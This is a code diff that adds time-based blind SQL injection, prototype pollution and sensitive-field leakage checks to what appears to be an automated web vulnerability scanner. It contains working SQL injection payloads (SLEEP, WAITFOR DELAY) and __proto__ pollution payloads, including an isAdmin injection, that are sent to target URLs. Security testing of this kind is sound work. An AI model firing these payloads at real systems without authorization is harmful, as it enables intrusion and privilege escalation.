@@ -225,6 +225,43 @@ async def test_sqli(
                     "confidence": "medium",
                 }
 
+        # Phase 4: Time-based blind SQLi
+        time_payloads = [
+            (f"{original_value}' AND SLEEP(3)-- -", 3),
+            (f"{original_value}' AND SLEEP(3)#", 3),
+            (f"{original_value}; WAITFOR DELAY '0:0:3'-- -", 3),
+            (f"{original_value}' OR SLEEP(3)-- -", 3),
+            (f"{original_value}) AND SLEEP(3)-- -", 3),
+            (f"1 AND SLEEP(3)", 3),
+        ]
+
+        baseline_times = []
+        for _ in range(2):
+            t0 = time.monotonic()
+            await _send(session, target_url)
+            baseline_times.append(time.monotonic() - t0)
+        avg_baseline = sum(baseline_times) / len(baseline_times)
+
+        for payload, delay in time_payloads:
+            test_url = _replace_param(target_url, param, payload)
+            t_start = time.monotonic()
+            status, body, _ = await _send(session, test_url)
+            elapsed = time.monotonic() - t_start
+
+            if status == 0:
+                continue
+
+            if elapsed > avg_baseline + delay - 0.5 and elapsed > delay:
+                return {
+                    "vulnerable": True,
+                    "url": test_url,
+                    "param": param,
+                    "technique": "time-based-blind",
+                    "payload": payload,
+                    "evidence": f"Response delayed {elapsed:.1f}s vs baseline {avg_baseline:.1f}s (injected {delay}s delay)",
+                    "confidence": "medium",
+                }
+
     return {"vulnerable": False, "url": target_url, "param": param}
 
 
@@ -834,6 +871,112 @@ async def test_csti(
                 }
 
     return {"vulnerable": False, "url": target_url, "param": param}
+
+
+# ---------------------------------------------------------------------------
+# Prototype Pollution Testing
+# ---------------------------------------------------------------------------
+
+
+async def test_prototype_pollution(
+    target_url: str, param: str, original_value: str,
+) -> dict[str, Any]:
+    """Test for client-side prototype pollution via query/JSON params."""
+    async with aiohttp.ClientSession() as session:
+        # Baseline
+        baseline_status, baseline_body, baseline_headers = await _send(session, target_url)
+        if baseline_status == 0:
+            return {"vulnerable": False, "url": target_url, "param": param}
+
+        # Test payloads — inject __proto__ via query param
+        payloads = [
+            ('{"__proto__":{"polluted":"true"}}', 'polluted'),
+            ('{"__proto__":{"isAdmin":true}}', 'isAdmin'),
+            ('{"constructor":{"prototype":{"polluted":"true"}}}', 'polluted'),
+        ]
+
+        for payload, marker in payloads:
+            test_url = _replace_param(target_url, param, payload)
+            status, body, headers = await _send(session, test_url)
+
+            if status == 0:
+                continue
+
+            # Check if pollution marker appears in response
+            if marker in body and marker not in baseline_body:
+                return {
+                    "vulnerable": True,
+                    "url": test_url,
+                    "param": param,
+                    "payload": payload,
+                    "evidence": f"Prototype pollution: '{marker}' appeared in response after injection",
+                    "confidence": "medium",
+                }
+
+            # Check for different response (pollution changed behavior)
+            if abs(len(body) - len(baseline_body)) > 200 and status == baseline_status:
+                return {
+                    "vulnerable": True,
+                    "url": test_url,
+                    "param": param,
+                    "payload": payload,
+                    "evidence": f"Response size changed significantly ({len(baseline_body)} → {len(body)} bytes) after prototype pollution injection",
+                    "confidence": "low",
+                    "suspicious": True,
+                }
+
+    return {"vulnerable": False, "url": target_url, "param": param}
+
+
+# ---------------------------------------------------------------------------
+# Sensitive Field Leakage Testing
+# ---------------------------------------------------------------------------
+
+_SENSITIVE_FIELD_PATTERNS = re.compile(
+    r'"(?:password|passwd|password_hash|secret|token|api_key|apikey|'
+    r'private_key|secret_key|totp_secret|mfa_secret|2fa_secret|'
+    r'ssn|social_security|credit_card|card_number|cvv|'
+    r'session_token|refresh_token|access_token|auth_token)"'
+    r'\s*:\s*"[^"]{3,}"',
+    re.I,
+)
+
+
+async def test_sensitive_leakage(
+    target_url: str, param: str = "", original_value: str = "",
+) -> dict[str, Any]:
+    """Check API responses for leaked sensitive fields (password_hash, totp_secret, etc.)."""
+    async with aiohttp.ClientSession() as session:
+        status, body, headers = await _send(session, target_url)
+
+        if status == 0 or not body:
+            return {"vulnerable": False, "url": target_url}
+
+        ct = headers.get("content-type", "")
+        if "application/json" not in ct and "text/json" not in ct:
+            return {"vulnerable": False, "url": target_url}
+
+        matches = _SENSITIVE_FIELD_PATTERNS.findall(body)
+        if matches:
+            # Truncate actual values for evidence
+            safe_matches = []
+            for m in matches[:5]:
+                # Mask the value
+                parts = m.split(':', 1)
+                if len(parts) == 2:
+                    field = parts[0].strip()
+                    safe_matches.append(f"{field}: [REDACTED]")
+
+            return {
+                "vulnerable": True,
+                "url": target_url,
+                "param": "",
+                "evidence": f"Sensitive fields leaked in API response: {', '.join(safe_matches)}",
+                "fields_found": [m.split('"')[1] for m in matches[:5]],
+                "confidence": "high",
+            }
+
+    return {"vulnerable": False, "url": target_url}
 
 
 # ---------------------------------------------------------------------------
